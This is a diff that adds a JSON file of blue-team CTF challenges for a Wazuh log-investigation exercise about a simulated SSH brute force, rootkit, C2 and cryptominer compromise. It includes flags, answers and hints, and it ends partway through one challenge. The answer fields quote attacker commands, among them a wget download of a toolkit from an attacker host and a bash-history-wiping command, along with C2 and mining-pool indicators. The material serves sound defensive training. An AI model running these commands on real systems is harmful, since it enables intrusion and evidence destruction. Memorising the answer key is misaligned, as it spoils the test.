@@ -1,0 +1,1386 @@
+{
+  "scenario": {
+    "id": 3,
+    "name": "Ghost in the Shell",
+    "codename": "ghost_shell",
+    "category": "Scenario 3: Ghost in the Shell",
+    "description": "A Linux server (lnx-srv) exposed to the internet is compromised via SSH brute force. The attacker installs a kernel rootkit, establishes a covert C2 channel, deploys a cryptominer, and attempts to tamper with logs to cover their tracks. Investigate using Wazuh alerts, auditd events, and system integrity monitoring.",
+    "victim_host": "lnx-srv",
+    "attack_timeframe": "2026-03-03T02:00:00Z to 2026-03-03T18:00:00Z",
+    "kill_chain_summary": [
+      "SSH brute force (thousands of failed attempts)",
+      "Successful login with compromised credentials",
+      "Download of malicious toolkit via wget/curl",
+      "Kernel rootkit installation (loadable kernel module)",
+      "Reverse shell / C2 channel establishment",
+      "Cryptominer deployment",
+      "Log tampering and evidence destruction"
+    ]
+  },
+  "challenges": [
+    {
+      "id": "S3-PUP-01",
+      "name": "[Pup] SSH Brute Force Count",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "How many failed SSH login attempts were recorded on lnx-srv before the attacker successfully authenticated?\n\nCount the total number of failed SSH authentication alerts (rule.id 5710 or 5716) from the attacker's source IP before the first successful login from the same IP.",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "8347",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "ssh",
+        "brute-force",
+        "count"
+      ],
+      "hints": [
+        {
+          "content": "Filter for rule.id: 5710 (sshd: Attempt to login using a non-existent user) or 5716 (sshd: authentication failed) on agent lnx-srv. Count the total hits before the first Event ID 5715 (successful login) from the same IP.",
+          "cost": 25
+        },
+        {
+          "content": "First identify the attacker's IP by finding which source IP had the successful login that was preceded by many failures. Then count all failures from that IP with timestamp < successful_login_time.",
+          "cost": 25
+        },
+        {
+          "content": "The count is a four-digit number above 8000. The brute force attack ran for several hours before succeeding.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-PUP-02",
+      "name": "[Pup] Attack Origin Country",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "According to Wazuh's GeoIP enrichment, from which country did the SSH brute force attack originate?\n\nCheck the GeoIP location fields in the Wazuh alerts for the attacker's source IP address.",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "Russia",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "geoip",
+        "threat-intel"
+      ],
+      "hints": [
+        {
+          "content": "Wazuh enriches alerts with GeoIP data. Look for the data.geoip.country_name or GeoLocation.country_name field in the SSH brute force alerts.",
+          "cost": 25
+        },
+        {
+          "content": "The attacker's IP (203.0.113.42) resolves to an Eastern European country. Check the GeoIP fields associated with this IP in any of the SSH alerts.",
+          "cost": 25
+        },
+        {
+          "content": "The country is one of the most commonly associated with SSH brute force attacks in threat intelligence feeds. It starts with 'R'.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-PUP-03",
+      "name": "[Pup] Successful Login Timestamp",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "At what time (UTC) did the attacker successfully log in to lnx-srv via SSH?\n\nFind the timestamp of the first successful authentication event from the attacker's IP address.",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "2026-03-03T05:23:41Z",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "timestamp",
+        "ssh"
+      ],
+      "hints": [
+        {
+          "content": "Search for rule.id 5715 (sshd: authentication success) on lnx-srv from the attacker's IP. The @timestamp field gives you the exact time.",
+          "cost": 25
+        },
+        {
+          "content": "After identifying the attacker's IP (the one with thousands of failed attempts), search for successful SSH login alerts from that same IP. The login occurred in the early morning UTC.",
+          "cost": 25
+        },
+        {
+          "content": "The successful login happened around 05:23 UTC on March 3rd. Provide the full ISO 8601 timestamp with seconds.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-PUP-04",
+      "name": "[Pup] Attacker IP Address",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "What is the source IP address of the attacker who conducted the SSH brute force attack against lnx-srv?\n\nExamine the SSH authentication failure alerts to identify the external IP responsible for the vast majority of failed login attempts.",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "203.0.113.42",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "ip-address",
+        "attacker",
+        "ssh"
+      ],
+      "hints": [
+        {
+          "content": "Look at the data.srcip field in the SSH brute force alerts (rule.id 5710 or 5716) on lnx-srv. The attacker's IP will have the highest number of failed login attempts.",
+          "cost": 25
+        },
+        {
+          "content": "Aggregate the SSH failure alerts by source IP and sort by count. The attacker's IP will stand out with thousands of attempts compared to any legitimate traffic.",
+          "cost": 25
+        },
+        {
+          "content": "The attacker's IP is in the 203.0.113.0/24 range, which is a documentation/test range commonly used in examples. Look for the IP with 8000+ failed attempts.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-PUP-05",
+      "name": "[Pup] Brute Force Primary Rule ID",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "What is the primary Wazuh rule ID that fires for the SSH brute force failed login attempts on lnx-srv?\n\nIdentify the rule.id that generated the majority of alerts during the brute force phase of the attack.",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "5710",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "rule-id",
+        "ssh",
+        "brute-force"
+      ],
+      "hints": [
+        {
+          "content": "Filter alerts on lnx-srv during the brute force timeframe and look at the rule.id field. The primary rule for SSH failures involving non-existent users is in the 5700 range.",
+          "cost": 25
+        },
+        {
+          "content": "Wazuh has several SSH-related rules: 5710 (attempt to login using a non-existent user), 5716 (authentication failed), and 5715 (authentication success). Which one fires the most during the brute force?",
+          "cost": 25
+        },
+        {
+          "content": "The primary rule ID is 5710, which corresponds to 'sshd: Attempt to login using a non-existent user'. This fires when the attacker tries usernames that do not exist on the system.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-PUP-06",
+      "name": "[Pup] Attack Origin City",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "According to Wazuh's GeoIP enrichment, from which city did the SSH brute force attack originate?\n\nCheck the GeoIP city-level location fields in the Wazuh alerts for the attacker's source IP address.",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "Moscow",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "geoip",
+        "city",
+        "threat-intel"
+      ],
+      "hints": [
+        {
+          "content": "Wazuh enriches alerts with GeoIP data at the city level. Look for the data.geoip.city_name or GeoLocation.city_name field in the SSH brute force alerts from the attacker's IP.",
+          "cost": 25
+        },
+        {
+          "content": "The attacker's IP resolves to the capital city of the country identified in the origin country challenge. Check the GeoIP city field in any SSH alert from 203.0.113.42.",
+          "cost": 25
+        },
+        {
+          "content": "The city is the capital and largest city of Russia. It starts with 'M'.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-PUP-07",
+      "name": "[Pup] High-Severity Alert Count",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "How many alerts with rule.level >= 10 (High severity) were generated on lnx-srv during the Ghost in the Shell incident?\n\nUse the Wazuh Dashboard to filter alerts by agent name and severity level for the attack date (2026-03-03).",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "207",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "alert-count",
+        "high-severity"
+      ],
+      "hints": [
+        {
+          "content": "In Wazuh Dashboard, filter by agent.name: lnx-srv and add a filter for rule.level >= 10. The hit count shown at the top of the Discover view is your answer.",
+          "cost": 25
+        },
+        {
+          "content": "High-severity alerts (level 10+) indicate the most critical security detections. Normal system noise will have lower severity levels, so this filter helps you focus on the attack.",
+          "cost": 25
+        },
+        {
+          "content": "The answer is a three-digit number. Most of these high-severity alerts are related to the SSH brute force and post-exploitation activity.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-PUP-08",
+      "name": "[Pup] Brute Force Start Time",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "At what time (UTC) did the SSH brute force attack begin against lnx-srv?\n\nFind the timestamp of the very first SSH failed authentication alert from the attacker's IP address.",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "2026-03-03T02:00:00Z",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "timestamp",
+        "brute-force",
+        "start-time"
+      ],
+      "hints": [
+        {
+          "content": "Filter for SSH failure alerts (rule.id 5710 or 5716) from the attacker's IP on lnx-srv and sort by timestamp ascending. The first alert marks the start of the brute force attack.",
+          "cost": 25
+        },
+        {
+          "content": "The brute force attack started in the early hours of March 3rd, 2026 UTC. Look at the oldest SSH failure alert from 203.0.113.42.",
+          "cost": 25
+        },
+        {
+          "content": "The attack started exactly at 02:00:00 UTC on March 3rd, 2026. Provide the full ISO 8601 timestamp.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-PUP-09",
+      "name": "[Pup] FIM Rule Description",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "What is the rule.description text for the Wazuh File Integrity Monitoring (FIM) alerts that detected system file modifications on lnx-srv?\n\nIdentify the exact rule description used by syscheck when it detects that a monitored file's checksum has changed.",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "Integrity checksum changed",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "fim",
+        "syscheck",
+        "rule-description"
+      ],
+      "hints": [
+        {
+          "content": "Look for syscheck alerts on lnx-srv that were triggered after the attacker's toolkit was deployed. The rule.description field contains the human-readable description of the detection.",
+          "cost": 25
+        },
+        {
+          "content": "Wazuh's FIM module (syscheck) uses rule 550 for file modification detection. Check the rule.description field for this rule ID.",
+          "cost": 25
+        },
+        {
+          "content": "The description is three words and relates to the integrity of a file's checksum being different from the known baseline.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-PUP-10",
+      "name": "[Pup] SSH Login Source Port",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Pup",
+      "description": "What source port did the attacker use for the successful SSH login connection to lnx-srv?\n\nExamine the successful SSH authentication alert to find the source (ephemeral) port used by the attacker's connection.",
+      "value": 100,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "48231",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "pup",
+        "scenario3",
+        "ssh",
+        "source-port",
+        "network"
+      ],
+      "hints": [
+        {
+          "content": "Look at the successful SSH login alert (rule.id 5715) from the attacker's IP. The source port is recorded in the data.srcport field of the alert.",
+          "cost": 25
+        },
+        {
+          "content": "Ephemeral source ports are typically in the range 32768-65535. Check the srcport field in the SSH authentication success event from 203.0.113.42.",
+          "cost": 25
+        },
+        {
+          "content": "The source port is a five-digit number starting with 48. It is the ephemeral port assigned by the attacker's operating system for the outbound SSH connection.",
+          "cost": 25
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-01",
+      "name": "[Hunter] Compromised User Account",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "What user account was compromised by the SSH brute force attack on lnx-srv?\n\nIdentify the Linux username that the attacker successfully authenticated with after the brute force phase.",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "deploy",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "user-account",
+        "ssh"
+      ],
+      "hints": [
+        {
+          "content": "Look at the data.dstuser or data.srcuser field in the successful SSH login alert (rule.id 5715) from the attacker's IP on lnx-srv.",
+          "cost": 50
+        },
+        {
+          "content": "The compromised account is a service/application account commonly found on deployment servers, not a personal user account. It likely has a weak password.",
+          "cost": 50
+        },
+        {
+          "content": "The username is 'deploy' - a common service account name used for application deployments that often has weak or default credentials.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-02",
+      "name": "[Hunter] Malicious Toolkit Download URL",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "What is the full URL used to download the malicious toolkit onto lnx-srv?\n\nAnalyze command execution logs and network connection events to find the download command and the URL of the remote payload.",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "http://203.0.113.100/tools/linpeas_kit.tar.gz",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "download",
+        "ioc",
+        "url"
+      ],
+      "hints": [
+        {
+          "content": "Look for auditd EXECVE events or Wazuh command monitoring alerts that contain 'wget' or 'curl' commands. The URL will be in the command arguments.",
+          "cost": 50
+        },
+        {
+          "content": "Search for alerts where data.audit.execve.a0 is 'wget' or 'curl' on lnx-srv, occurring after the successful SSH login. The URL points to the attacker's staging server.",
+          "cost": 50
+        },
+        {
+          "content": "The toolkit was downloaded from the attacker's infrastructure at IP 203.0.113.100. The file is a compressed tarball (.tar.gz) in a /tools/ directory.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-03",
+      "name": "[Hunter] System File Modification Rule",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "What Wazuh rule (provide rule.id and rule.description) detected the modification of critical system files after the toolkit was deployed?\n\nProvide the answer in format: rule_id:description",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "550:Integrity checksum changed",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "fim",
+        "syscheck",
+        "rule-id"
+      ],
+      "hints": [
+        {
+          "content": "Wazuh's File Integrity Monitoring (syscheck) uses rules in the 550-553 range for detecting file changes. Look for FIM alerts on lnx-srv after the toolkit download.",
+          "cost": 50
+        },
+        {
+          "content": "Rule 550 is triggered when syscheck detects that a monitored file's integrity checksum has changed. This fires when system binaries or configuration files are modified.",
+          "cost": 50
+        },
+        {
+          "content": "The answer format is 'rule_id:description'. Rule 550 has the description 'Integrity checksum changed.' which indicates a monitored file was modified.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-04",
+      "name": "[Hunter] Toolkit wget Command",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "What is the complete wget command that the attacker used to download the malicious toolkit onto lnx-srv?\n\nReconstruct the full command line by examining auditd EXECVE events that captured the wget execution with all its arguments.",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "wget http://203.0.113.100/tools/linpeas_kit.tar.gz -O /tmp/linpeas_kit.tar.gz",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "wget",
+        "command-line",
+        "auditd"
+      ],
+      "hints": [
+        {
+          "content": "Auditd EXECVE events capture the full command line. Look for events where data.audit.execve.a0 is 'wget' on lnx-srv after the SSH login. The arguments a1, a2, a3 contain the URL and output options.",
+          "cost": 50
+        },
+        {
+          "content": "The wget command uses the -O flag to specify a custom output path. The toolkit was saved to the /tmp/ directory. Reconstruct the full command from the EXECVE argument fields.",
+          "cost": 50
+        },
+        {
+          "content": "The complete command is: wget http://203.0.113.100/tools/linpeas_kit.tar.gz -O /tmp/linpeas_kit.tar.gz. The attacker saved the file to /tmp/ to avoid writing to monitored directories.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-05",
+      "name": "[Hunter] Toolkit Extraction Path",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "To what directory path did the attacker extract the downloaded toolkit on lnx-srv?\n\nExamine auditd events or FIM alerts to determine where the tarball contents were extracted after download.",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "/tmp/.tools/",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "extraction",
+        "file-path",
+        "auditd"
+      ],
+      "hints": [
+        {
+          "content": "Look for tar extraction commands in auditd EXECVE events on lnx-srv after the wget download. The extraction path is specified with the -C flag or as the target directory argument.",
+          "cost": 50
+        },
+        {
+          "content": "The attacker extracted the toolkit to a hidden directory (starting with a dot) under /tmp/ to avoid casual detection. Look for directories created under /tmp/ that start with a period.",
+          "cost": 50
+        },
+        {
+          "content": "The extraction path is /tmp/.tools/ — a hidden directory in /tmp/ used to stage the attacker's post-exploitation tools. Include the trailing slash.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-06",
+      "name": "[Hunter] FIM Modified File Count",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "How many distinct files were flagged as modified by Wazuh's File Integrity Monitoring (syscheck) on lnx-srv during the attack?\n\nCount the total number of unique file paths that triggered FIM 'modified' alerts (rule.id 550) during the incident timeframe.",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "21",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "fim",
+        "syscheck",
+        "file-count"
+      ],
+      "hints": [
+        {
+          "content": "Filter for rule.id 550 on lnx-srv during the attack timeframe. Then aggregate by the syscheck.path field to count unique file paths that were modified.",
+          "cost": 50
+        },
+        {
+          "content": "The modified files include system configuration files (/etc/), system binaries, and log files. Use a terms aggregation on syscheck.path to get the distinct count.",
+          "cost": 50
+        },
+        {
+          "content": "The count is a two-digit number just above 20. It includes files like /etc/passwd, /etc/shadow, /etc/sudoers, SSH config files, and various system binaries.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-07",
+      "name": "[Hunter] C2 DNS Domain",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "What domain name did the C2 (Command and Control) beacon on lnx-srv resolve via DNS queries?\n\nExamine DNS query alerts or network monitoring events to identify the domain used for C2 communication.",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "update.systemnodes.net",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "c2",
+        "dns",
+        "domain"
+      ],
+      "hints": [
+        {
+          "content": "Look for DNS query alerts on lnx-srv after the rootkit installation. The C2 domain will appear in suspicious DNS resolution events. Check data.dns.question.name or similar fields.",
+          "cost": 50
+        },
+        {
+          "content": "The C2 domain is designed to look like a legitimate system update service. It uses a subdomain pattern of 'update.' followed by a generic-sounding domain name.",
+          "cost": 50
+        },
+        {
+          "content": "The C2 domain is update.systemnodes.net — it mimics a legitimate system update check to blend in with normal network traffic.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-08",
+      "name": "[Hunter] Cryptominer Pool Port",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "What port number does the cryptominer on lnx-srv use to connect to its mining pool?\n\nAnalyze network connection alerts or auditd socket events to identify the destination port used for mining pool communication.",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "3333",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "cryptominer",
+        "mining-pool",
+        "port"
+      ],
+      "hints": [
+        {
+          "content": "Cryptominers connect to mining pool servers on well-known ports. Look for outbound connections from lnx-srv to external IPs on common mining pool ports (3333, 4444, 8333, etc.).",
+          "cost": 50
+        },
+        {
+          "content": "The mining pool domain is stratum.cryptopool.xyz. Look for DNS queries or network connections to this domain and check the destination port used.",
+          "cost": 50
+        },
+        {
+          "content": "The cryptominer connects on port 3333, which is the standard Stratum mining protocol port used by most cryptocurrency mining pools.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-09",
+      "name": "[Hunter] History Clearing Command",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "What command did the attacker execute to clear their bash history on lnx-srv?\n\nExamine auditd command execution events or Wazuh command monitoring alerts to find the exact command used to erase shell history.",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "history -c; > ~/.bash_history",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "anti-forensics",
+        "history",
+        "command"
+      ],
+      "hints": [
+        {
+          "content": "Look for auditd EXECVE events containing 'history' or commands that write to ~/.bash_history on lnx-srv. The attacker used a compound command to both clear the in-memory history and truncate the history file.",
+          "cost": 50
+        },
+        {
+          "content": "The attacker used two commands chained together: one to clear the current session's history from memory, and another to truncate the persistent history file on disk.",
+          "cost": 50
+        },
+        {
+          "content": "The command is: history -c; > ~/.bash_history. The first part clears the in-memory history, and the redirect '>' truncates the history file to zero bytes.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-HNT-10",
+      "name": "[Hunter] SSH Program Name",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Hunter",
+      "description": "What is the program name (data.program_name or predecoder.program_name) recorded in the SSH authentication alerts on lnx-srv?\n\nIdentify the exact program name field value associated with the SSH login events in the Wazuh alerts.",
+      "value": 200,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "sshd",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "hunter",
+        "scenario3",
+        "ssh",
+        "program-name",
+        "log-analysis"
+      ],
+      "hints": [
+        {
+          "content": "Wazuh parses syslog messages and extracts the program name from the log header. Look at the data.program_name or predecoder.program_name field in any SSH-related alert on lnx-srv.",
+          "cost": 50
+        },
+        {
+          "content": "The program name is the name of the daemon that generates the SSH authentication log messages. On Linux systems, this is the SSH server daemon process.",
+          "cost": 50
+        },
+        {
+          "content": "The program name is 'sshd' — the OpenSSH server daemon. All SSH authentication events (both failures and successes) are logged by this program.",
+          "cost": 50
+        }
+      ]
+    },
+    {
+      "id": "S3-ALP-01",
+      "name": "[Alpha] Rootkit Kernel Module Name",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Alpha",
+      "description": "What is the exact name of the kernel module that was loaded as a rootkit on lnx-srv?\n\nAnalyze auditd module loading events, Wazuh rootcheck alerts, and kernel-related system events to identify the malicious loadable kernel module (LKM).",
+      "value": 300,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "syshook.ko",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "alpha",
+        "scenario3",
+        "rootkit",
+        "kernel-module",
+        "lkm"
+      ],
+      "hints": [
+        {
+          "content": "Look for auditd events related to kernel module loading. The relevant syscall is init_module or finit_module. Search for alerts with data.audit.syscall containing these values.",
+          "cost": 75
+        },
+        {
+          "content": "Also check Wazuh rootcheck alerts (rule.groups: rootcheck) and look for alerts mentioning hidden kernel modules or suspicious module loading activity on lnx-srv.",
+          "cost": 75
+        },
+        {
+          "content": "The kernel module file has a .ko extension and a name that suggests system hooking functionality. Check insmod/modprobe commands in the auditd EXECVE events.",
+          "cost": 75
+        }
+      ]
+    },
+    {
+      "id": "S3-ALP-02",
+      "name": "[Alpha] C2 Channel Port and Protocol",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Alpha",
+      "description": "What port number and transport protocol did the C2 (Command and Control) channel use on lnx-srv?\n\nProvide the answer in format: port/protocol (e.g., 443/tcp)",
+      "value": 300,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "8443/tcp",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "alpha",
+        "scenario3",
+        "c2",
+        "network",
+        "port"
+      ],
+      "hints": [
+        {
+          "content": "Look for persistent outbound network connections from lnx-srv to external IPs after the rootkit installation. Auditd socket/connect events or Wazuh network anomaly alerts will show the C2 traffic.",
+          "cost": 75
+        },
+        {
+          "content": "The C2 channel uses a non-standard high port that mimics HTTPS traffic. Check auditd connect syscall events or netstat-like output captured by Wazuh SCA/syscollector.",
+          "cost": 75
+        },
+        {
+          "content": "The C2 operates on TCP port 8443, which is a common alternative HTTPS port. The reverse shell connects back to the attacker's IP over this port.",
+          "cost": 75
+        }
+      ]
+    },
+    {
+      "id": "S3-ALP-03",
+      "name": "[Alpha] Auditd Rules for Module Loading",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Alpha",
+      "description": "What auditd rule key would detect the loading of the malicious kernel module? Provide the specific auditd rule key name from the audit.rules configuration that triggers on init_module/finit_module syscalls.\n\nIdentify the exact audit rule key that generated the alert for the kernel module loading event.",
+      "value": 300,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "modules",
+          "case_sensitive": true
+        }
+      ],
+      "tags": [
+        "alpha",
+        "scenario3",
+        "auditd",
+        "kernel-module",
+        "detection"
+      ],
+      "hints": [
+        {
+          "content": "Auditd rules use 'key' fields to tag and categorize events. The rule for monitoring kernel module loading syscalls (init_module, finit_module, delete_module) uses a descriptive key name.",
+          "cost": 75
+        },
+        {
+          "content": "In the data.audit.key field of the Wazuh alert, you'll find the key assigned to the auditd rule. Standard audit rule sets (like those from CIS benchmarks) use the key 'modules' for module-related syscalls.",
+          "cost": 75
+        },
+        {
+          "content": "The auditd rule is: -a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -k modules. The key is 'modules'.",
+          "cost": 75
+        }
+      ]
+    },
+    {
+      "id": "S3-ALP-04",
+      "name": "[Alpha] Rootkit Detection Rule ID",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Alpha",
+      "description": "What is the custom Wazuh rule ID that detected the rootkit activity on lnx-srv?\n\nIdentify the specific rule.id from the custom WazuhBOTS rules that fired when rootkit-related behavior was detected on the compromised Linux server.",
+      "value": 300,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "87943",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "alpha",
+        "scenario3",
+        "rootkit",
+        "rule-id",
+        "custom-rules"
+      ],
+      "hints": [
+        {
+          "content": "The WazuhBOTS platform includes custom detection rules with IDs in the 87900+ range. Look for alerts in this rule ID range on lnx-srv that are related to rootkit or kernel module activity.",
+          "cost": 75
+        },
+        {
+          "content": "Filter alerts on lnx-srv by rule.id > 87900 and look for rules related to rootkit detection, hidden kernel modules, or suspicious module loading. The custom rules are defined in custom_bots_rules.xml.",
+          "cost": 75
+        },
+        {
+          "content": "The rootkit detection rule ID is 87943. This is a custom WazuhBOTS correlation rule that fires when rootkit-related indicators are detected.",
+          "cost": 75
+        }
+      ]
+    },
+    {
+      "id": "S3-ALP-05",
+      "name": "[Alpha] MITRE Technique for Brute Force",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Alpha",
+      "description": "What is the MITRE ATT&CK technique ID associated with the SSH brute force attack in the Wazuh alerts?\n\nIdentify the specific MITRE ATT&CK sub-technique ID tagged in the SSH brute force alerts on lnx-srv.",
+      "value": 300,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "T1110.001",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "alpha",
+        "scenario3",
+        "mitre",
+        "brute-force",
+        "threat-framework"
+      ],
+      "hints": [
+        {
+          "content": "Wazuh maps alerts to MITRE ATT&CK techniques. Look at the rule.mitre.id field in the SSH brute force alerts (rule.id 5710 or 5716) on lnx-srv.",
+          "cost": 75
+        },
+        {
+          "content": "The MITRE ATT&CK technique for brute force is T1110, with several sub-techniques. SSH password guessing falls under a specific sub-technique. Check the rule.mitre.id field.",
+          "cost": 75
+        },
+        {
+          "content": "The sub-technique is T1110.001 (Brute Force: Password Guessing). This is the specific MITRE technique for attempting to guess passwords through repeated login attempts.",
+          "cost": 75
+        }
+      ]
+    },
+    {
+      "id": "S3-ALP-06",
+      "name": "[Alpha] Critical System Files Modified",
+      "category": "Scenario 3: Ghost in the Shell",
+      "level": "Alpha",
+      "description": "How many critical system configuration files in /etc/ were modified by the attacker? Specifically, count only the high-value files: /etc/passwd, /etc/shadow, /etc/sudoers, and /etc/ssh/sshd_config.\n\nAnalyze FIM alerts to determine how many of these four critical files had their checksums changed during the attack.",
+      "value": 300,
+      "type": "standard",
+      "state": "visible",
+      "flags": [
+        {
+          "type": "static",
+          "content": "4",
+          "case_sensitive": false
+        }
+      ],
+      "tags": [
+        "alpha",
+        "scenario3",
+        "fim",
+        "critical-files",
+        "system-config"
+      ],
+      "hints": [
+        {
+          "content": "Filter FIM alerts (rule.id 550) on lnx-srv and check the syscheck.path field for these four specific files: /etc/passwd, /etc/shadow, /etc/sudoers, and /etc/ssh/sshd_config.",
+          "cost": 75
+        },
+        {
+          "content": "The attacker modified system configuration files to maintain persistence and elevate privileges. Check whether each of the four named files appears in the FIM modified alerts.",
+          "cost": 75
+        },
+        {
